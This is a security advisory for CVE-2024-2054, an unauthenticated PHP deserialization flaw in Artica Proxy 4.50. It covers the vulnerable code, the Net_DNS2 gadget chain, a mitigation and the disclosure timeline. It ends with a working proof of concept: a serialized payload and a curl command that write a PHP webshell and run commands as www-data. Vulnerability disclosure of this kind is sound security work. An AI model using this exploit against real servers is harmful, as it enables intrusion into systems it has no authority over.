@@ -1,0 +1,146 @@
+id: 39425
+date: 03/06/2024
+title: Artica Proxy 4.50 Unauthenticated PHP Deserialization Vulnerability
+author: Jim Becher
+cves: CVE-2024-2054
+
+Title: Artica Proxy Unauthenticated PHP Deserialization Vulnerability
+Advisory ID: KL-001-2024-002
+Publication Date: 2024.03.05
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-002.txt
+
+
+1. Vulnerability Details
+
+      Affected Vendor: Artica
+      Affected Product: Artica Proxy
+      Affected Version: 4.50
+      Platform: Debian 10 LTS
+      CWE Classification: CWE-502 Deserialization of Untrusted Data
+      CVE ID: CVE-2024-2054
+
+
+2. Vulnerability Description
+
+      The Artica Proxy administrative web application will deserialize
+      arbitrary PHP objects supplied by unauthenticated users and
+      subsequently enable code execution as the "www-data" user.
+
+
+3. Technical Description
+
+      Prior to authentication, a user can send an HTTP request
+      to the "/wizard/wiz.wizard.progress.php" endpoint. This
+      endpoint processes the "build-js" query parameter by base64
+      decoding the provided value and then calling the "unserialize"
+      PHP function with the decoded value as input.
+
+      Code snippet from "wiz.wizard.progress.php":
+
+        if(isset($_GET["build-js"])){buildjs();exit;}
+        ...
+        $ARRAY=unserialize(base64_decode($_GET["build-js"]));
+
+      To exploit this vulnerability, a user can leverage the
+      installed "Net_DNS2" library autoloader to instantiate the
+      "Net_DNS2_Cache_File" class. The "__destruct" method
+      within this class will write to arbitrary files defined
+      by the class:
+
+        public function __destruct()
+        {
+            //
+            // if there's no cache file set, then there's nothing to do
+            //
+            if (strlen($this->cache_file) == 0) {
+                return;
+            }
+
+            //
+            // open the file for reading/writing
+            //
+            $fp = fopen($this->cache_file, 'a+');
+            if ($fp !== false) {
+            ...
+            if (!is_null($data)) {
+
+                //
+                // write the file contents
+                //
+                fwrite($fp, $data);
+            }
+
+      An unauthenticated user can overwrite existing files and
+      insert a webshell to execute malicious PHP as the "www-data"
+      user.
+
+
+4. Mitigation and Remediation Recommendation
+
+      No response from vendor. This vulnerability can be remediated
+      by deleting the 'usr/share/artica-postfix/wizard' directory
+      if it is not needed. Otherwise, move it to a location outside
+      of the web root.
+
+
+5. Credit
+
+      This vulnerability was discovered by Jaggar Henry of KoreLogic,
+      Inc.
+
+
+6. Disclosure Timeline
+
+      2023.12.18 - KoreLogic requests vulnerability contact and
+                   secure communication method from Artica.
+      2023.12.18 - Artica Support issues automated ticket #1703011342
+                   promising follow-up from a human.
+      2024.01.10 - KoreLogic again requests vulnerability contact and
+                   secure communication method from Artica.
+      2024.01.10 - KoreLogic mail daemon receives SMTP 554 5.7.1 from
+                   mail.articatech.com with response
+                   "Client host rejected: Go Away!"
+      2024.01.11 - KoreLogic requests vulnerability contact and
+                   secure communication method via
+                   https://www.articatech.com/ 'Contact Us' web form.
+      2024.01.23 - KoreLogic requests CVE from MITRE.
+      2024.01.23 - MITRE issues automated ticket #1591692 promising
+                   follow-up from a human.
+      2024.02.01 - 30 business days have elapsed since KoreLogic
+                   attempted to contact the vendor.
+      2024.02.06 - KoreLogic requests update on CVE from MITRE.
+      2024.02.15 - KoreLogic requests update on CVE from MITRE.
+      2024.02.22 - KoreLogic reaches out to alternate CNA for
+                   CVE identifiers.
+      2024.02.26 - 45 business days have elapsed since KoreLogic
+                   attempted to contact the vendor.
+      2024.02.29 - Vulnerability details presented to AHA!
+                   (takeonme.org) by proxy.
+      2024.03.01 - AHA! issues CVE-2024-2054 to track this
+                   vulnerability.
+      2024.03.05 - KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+      To overwrite the "wiz.upload.php" file to contain a PHP
+      webshell, the following serialized object can be base64
+      encoded and submitted via the "build-js" query parameter:
+
+O:19:"Net_DNS2_Cache_File":4:{s:10:"cache_file";s:47:"/usr/share/artica-postfix/wizard/wiz.upload.php";s:16:"cache_serializer";s:4:"json";s:10:"cache_size";i:9999999999;s:10:"cache_data";a:1:{s:30:"<?php 
+system($_GET['cmd']); ?>";a:2:{s:10:"cache_date";i:0;s:3:"ttl";i:9999999999;}}}
+
+        $ ARTICA_URL="https://127.0.0.1:9000"; PAYLOAD_CMD="id"; curl -k 
+"$ARTICA_URL/wizard/wiz.wizard.progress.php?build-js=TzoxOToiTmV0X0ROUzJfQ2FjaGVfRmlsZSI6NDp7czoxMDoiY2FjaGVfZmlsZSI7czo0NzoiL3Vzci9zaGFyZS9hcnRpY2EtcG9zdGZpeC93aXphcmQvd2l6LnVwbG9hZC5waHAiO3M6MTY6ImNhY2hlX3NlcmlhbGl6ZXIiO3M6NDoianNvbiI7czoxMDoiY2FjaGVfc2l6ZSI7aTo5OTk5OTk5OTk5O3M6MTA6ImNhY2hlX2RhdGEiO2E6MTp7czozMDoiPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2bIjthOjI6e3M6MTA6ImNhY2hlX2RhdGUiO2k6MDtzOjM6InR0bCI7aTo5OTk5OTk5OTk5O319fQ%3d%3d" 
+&& curl -k "$ARTICA_URL/wizard/wiz.upload.php?cmd=$PAYLOAD_CMD";
+
+      {"uid=33(www-data) gid=33(www-data) groups=33(www-data)
+       ":{"cache_date":1696883506,"ttl":8303116493}}
+
+
+The contents of this advisory are copyright(c) 2024
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+#  0day.today [2024-03-15]  #
